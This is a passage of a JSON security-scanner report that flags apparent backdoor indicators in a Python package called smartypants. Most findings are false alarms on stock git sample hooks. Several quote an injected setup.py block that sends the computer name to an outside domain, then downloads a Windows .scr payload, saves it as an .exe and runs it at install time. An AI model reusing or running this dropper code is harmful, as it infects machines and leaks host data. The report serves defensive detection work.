                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-receive.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with 'echoback='\n# and rejects all pushes when the \"reject\" push option is used.\n#\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with 'echoback='\n# and rejects all pushes when the \"reject\" push option is used.\n#\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with 'echoback='\n# and rejects all pushes when the \"reject\" push option is used.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 24,
                  "endLine": 26,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n",
                    "rendered": {
                      "text": "\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n",
                      "markdown": "`\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 4,
                  "endLine": 49,
                  "endColumn": 9,
                  "snippet": {
                    "text": "fi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n",
                    "rendered": {
                      "text": "fi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n",
                      "markdown": "`fi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 1,
                  "endLine": 43,
                  "endColumn": 6,
                  "snippet": {
                    "text": "\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n\texit 1\nfi\n",
                    "rendered": {
                      "text": "\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n\texit 1\nfi\n",
                      "markdown": "`\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n\texit 1\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 34,
                  "endLine": 34,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n",
                    "rendered": {
                      "text": "\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n",
                      "markdown": "`\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 11,
                  "endLine": 31,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n\t# the square bracket bytes happen to fall in the designated range.\n\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\n",
                    "rendered": {
                      "text": "\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n\t# the square bracket bytes happen to fall in the designated range.\n\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\n",
                      "markdown": "`\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n\t# the square bracket bytes happen to fall in the designated range.\n\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 18,
                  "endLine": 14,
                  "endColumn": 24,
                  "snippet": {
                    "text": "then\n\tagainst=HEAD\nelse\n\t# Initial commit: diff against an empty tree object\n\tagainst=$(git hash-object -t tree /dev/null)\nfi\n\n",
                    "rendered": {
                      "text": "then\n\tagainst=HEAD\nelse\n\t# Initial commit: diff against an empty tree object\n\tagainst=$(git hash-object -t tree /dev/null)\nfi\n\n",
                      "markdown": "`then\n\tagainst=HEAD\nelse\n\t# Initial commit: diff against an empty tree object\n\tagainst=$(git hash-object -t tree /dev/null)\nfi\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 25,
                  "endLine": 10,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 2,
                  "endLine": 10,
                  "endColumn": 7,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000102"
          },
          "message": {
            "text": "Backdoor: Web Request in Setup",
            "id": "BD000102"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/setup.py"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 17,
                  "endLine": 21,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_32.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n",
                    "rendered": {
                      "text": "        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_32.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n",
                      "markdown": "`        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_32.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000102"
          },
          "message": {
            "text": "Backdoor: Web Request in Setup",
            "id": "BD000102"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/setup.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 12,
                  "endLine": 17,
                  "endColumn": 24,
                  "snippet": {
                    "text": "def send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_32.exe'\n",
                    "rendered": {
                      "text": "def send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_32.exe'\n",
                      "markdown": "`def send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_32.exe'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/setup.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 7,
                  "endLine": 16,
                  "endColumn": 12,
                  "snippet": {
                    "text": "# Injected code\ndef send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n",
                    "rendered": {
                      "text": "# Injected code\ndef send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n",
                      "markdown": "`# Injected code\ndef send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/setup.py"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 46,
                  "endLine": 71,
                  "endColumn": 51,
                  "snippet": {
                    "text": "    codecs.lookup('mbcs')\nexcept LookupError:\n    ascii = codecs.lookup('ascii')\n    func = lambda name, enc=ascii: {True: enc}.get(name == 'mbcs')\n    codecs.register(func)\n\n\n",
                    "rendered": {
                      "text": "    codecs.lookup('mbcs')\nexcept LookupError:\n    ascii = codecs.lookup('ascii')\n    func = lambda name, enc=ascii: {True: enc}.get(name == 'mbcs')\n    codecs.register(func)\n\n\n",
                      "markdown": "`    codecs.lookup('mbcs')\nexcept LookupError:\n    ascii = codecs.lookup('ascii')\n    func = lambda name, enc=ascii: {True: enc}.get(name == 'mbcs')\n    codecs.register(func)\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/setup.py"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 25,
                  "endLine": 21,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_32.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n",
                    "rendered": {
                      "text": "        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_32.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n",
                      "markdown": "`        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_32.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/setup.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 20,
                  "endLine": 17,
                  "endColumn": 25,
                  "snippet": {
                    "text": "def send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_32.exe'\n",
                    "rendered": {
                      "text": "def send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_32.exe'\n",
                      "markdown": "`def send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_32.exe'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 45,
                  "endLine": 161,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\nTo compute (2):\n\n",
                    "rendered": {
                      "text": "\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\nTo compute (2):\n\n",
                      "markdown": "`\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\nTo compute (2):\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 151,
                  "startColumn": 29,
                  "endLine": 151,
                  "endColumn": 33,
                  "snippet": {
                    "text": " * B has finished.  It has been fully merged up to \"master\" and \"next\",\n   and is ready to be deleted.\n\n * C has not merged to \"next\" at all.\n\nWe would want to allow C to be rebased, refuse A, and encourage\nB to be deleted.\n",
                    "rendered": {
                      "text": " * B has finished.  It has been fully merged up to \"master\" and \"next\",\n   and is ready to be deleted.\n\n * C has not merged to \"next\" at all.\n\nWe would want to allow C to be rebased, refuse A, and encourage\nB to be deleted.\n",
                      "markdown": "` * B has finished.  It has been fully merged up to \"master\" and \"next\",\n   and is ready to be deleted.\n\n * C has not merged to \"next\" at all.\n\nWe would want to allow C to be rebased, refuse A, and encourage\nB to be deleted.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 131,
                  "startColumn": 10,
                  "endLine": 131,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    fork the topic (perhaps with the same name) afresh from the\n    tip of \"master\".\n\nLet's look at this example:\n\n\t\t   o---o---o---o---o---o---o---o---o---o \"next\"\n\t\t  /       /           /           /\n",
                    "rendered": {
                      "text": "    fork the topic (perhaps with the same name) afresh from the\n    tip of \"master\".\n\nLet's look at this example:\n\n\t\t   o---o---o---o---o---o---o---o---o---o \"next\"\n\t\t  /       /           /           /\n",
                      "markdown": "`    fork the topic (perhaps with the same name) afresh from the\n    tip of \"master\".\n\nLet's look at this example:\n\n\t\t   o---o---o---o---o---o---o---o---o---o \"next\"\n\t\t  /       /           /           /\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 103,
                  "startColumn": 61,
                  "endLine": 104,
                  "snippet": {
                    "text": "\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n\n * Whenever you need to test or publish your changes to topic\n",
                    "rendered": {
                      "text": "\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n\n * Whenever you need to test or publish your changes to topic\n",
                      "markdown": "`\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n\n * Whenever you need to test or publish your changes to topic\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 165,
                  "endLine": 165,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\nTo compute (2):\n\n\tgit rev-list master..topic\n\n\tif this is empty, it is fully merged to \"master\".\n\n",
                    "rendered": {
                      "text": "\nTo compute (2):\n\n\tgit rev-list master..topic\n\n\tif this is empty, it is fully merged to \"master\".\n\n",
                      "markdown": "`\nTo compute (2):\n\n\tgit rev-list master..topic\n\n\tif this is empty, it is fully merged to \"master\".\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 159,
                  "endLine": 159,
                  "endColumn": 5,
                  "snippet": {
                    "text": "To compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\n",
                    "rendered": {
                      "text": "To compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\n",
                      "markdown": "`To compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 158,
                  "endLine": 158,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\nTo compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n",
                    "rendered": {
                      "text": "\nTo compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n",
                      "markdown": "`\nTo compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 125,
                  "startColumn": 12,
                  "endLine": 125,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\n(2) ... if a topic branch has been fully merged to \"master\".\n    Then you can delete it.  More importantly, you should not\n    build on top of it -- other people may already want to\n    change things related to the topic as patches against your\n    \"master\", so if you need further changes, it is better to\n    fork the topic (perhaps with the same name) afresh from the\n",
                    "rendered": {
                      "text": "\n(2) ... if a topic branch has been fully merged to \"master\".\n    Then you can delete it.  More importantly, you should not\n    build on top of it -- other people may already want to\n    change things related to the topic as patches against your\n    \"master\", so if you need further changes, it is better to\n    fork the topic (perhaps with the same name) afresh from the\n",
                      "markdown": "`\n(2) ... if a topic branch has been fully merged to \"master\".\n    Then you can delete it.  More importantly, you should not\n    build on top of it -- other people may already want to\n    change things related to the topic as patches against your\n    \"master\", so if you need further changes, it is better to\n    fork the topic (perhaps with the same name) afresh from the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-rebase.sample"
                },
